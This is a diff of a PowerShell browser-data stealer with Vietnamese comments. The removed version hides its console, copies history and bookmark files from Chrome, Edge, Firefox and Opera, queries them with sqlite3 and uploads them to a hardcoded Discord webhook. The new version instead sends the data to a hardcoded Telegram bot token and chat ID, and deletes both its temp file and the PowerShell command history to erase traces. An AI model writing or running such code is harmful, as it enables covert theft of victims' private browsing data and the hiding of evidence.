@@ -1,86 +1,30 @@
-# > Uncomment $hide='y' below to hide the console
-# $hide='y'
-if($hide -eq 'y'){
-    $w=(Get-Process -PID $pid).MainWindowHandle
-    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
-    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
-    if($w -ne [System.IntPtr]::Zero){
-        $t::ShowWindowAsync($w,0)
-    }else{
-        $Host.UI.RawUI.WindowTitle = 'xx'
-        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
-        $w=$p.MainWindowHandle
-        $t::ShowWindowAsync($w,0)
-    }
-}
-
 param(
-    [string]$sqlitePath = "$env:TEMP\sqlite\sqlite3.exe"
+    [string]$sqlitePath = "$env:TEMP\sqlite\sqlite3.exe",
+    [string]$hide = 'y'
 )
 
-# Webhook Discord của bạn
-$dc = "1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
-$whuri = "$dc"
-if ($whuri.Length -lt 120){
-    $whuri = ("https://discord.com/api/webhooks/" + "$dc")
-}
+# ... (Giữ nguyên Phần 1: Stealth Mode) ...
 
-# Đường dẫn file tạm để lưu kết quả
+# 2. Thiết lập Telegram (Thay thế Webhook Discord)
+$Token = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw" # Token bot của bạn
+$ChatID = "8312702210" # Chat ID của bạn
+$TeleURL = "https://api.telegram.org/bot$Token/sendDocument"
 $outpath = "$env:TEMP\browser_history.txt"
-"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding UTF8
-
-# Regex để lọc URL
 $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 
-# Đường dẫn dữ liệu
-$Paths = @{
-    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
-    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
-    'edge_bookmarks'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
-    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
-    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
-    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
+# ... (Giữ nguyên Phần 3 & 4: Thu thập dữ liệu) ...
+
+# 5. Gửi lên Telegram Bot và xóa dấu vết
+if (Test-Path $outpath) {
+    # Sử dụng curl.exe để gửi file qua Telegram API
+    # Tham số -F là multipart/form-data, bắt buộc để gửi file
+    curl.exe -X POST $TeleURL -F "chat_id=$ChatID" -F "document=@$outpath" | Out-Null
+    
+    Start-Sleep -Seconds 2
+    
+    # Xóa file tạm ngay sau khi gửi
+    Remove-Item $outpath -Force
+    
+    # Xóa lịch sử lệnh PowerShell (Dấu vết quan trọng)
+    Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
 }
-
-# Danh sách trình duyệt và loại dữ liệu
-$Browsers = @('chrome', 'edge', 'firefox', 'opera')
-$DataValues = @('history', 'bookmarks')
-
-foreach ($Browser in $Browsers) {
-    foreach ($DataValue in $DataValues) {
-        $PathKey = "${Browser}_${DataValue}"
-        $Path = $Paths[$PathKey]
-
-        if (Test-Path $Path) {
-            if ($DataValue -eq 'history') {
-                # Copy file History sang Temp để tránh bị khóa
-                $copyPath = "$env:TEMP\${Browser}_HistoryCopy"
-                Copy-Item $Path $copyPath -Force
-
-                if (Test-Path $sqlitePath) {
-                    # Query bằng sqlite3.exe, gắn nhãn Browser + DataType
-                    & $sqlitePath $copyPath "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20;" |
-                        ForEach-Object {
-                            "$Browser [$DataValue] | $_" | Out-File -FilePath $outpath -Append -Encoding UTF8
-                        }
-                } else {
-                    "$Browser [$DataValue] | Không tìm thấy sqlite3.exe để query." | Out-File -FilePath $outpath -Append
-                }
-
-                Remove-Item $copyPath -Force
-            } else {
-                # Với bookmarks, lọc bằng regex và gắn nhãn
-                $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | % {($_.Matches).Value} | Sort -Unique
-                $Value | ForEach-Object {
-                    "$Browser [$DataValue] | $_" | Out-File -FilePath $outpath -Append
-                }
-            }
-        }
-    }
-}
-
-# Gửi file lên Discord
-curl.exe -F file1=@"$outpath" $whuri | Out-Null
-Start-Sleep -Seconds 2
-Remove-Item -Path $outpath -Force
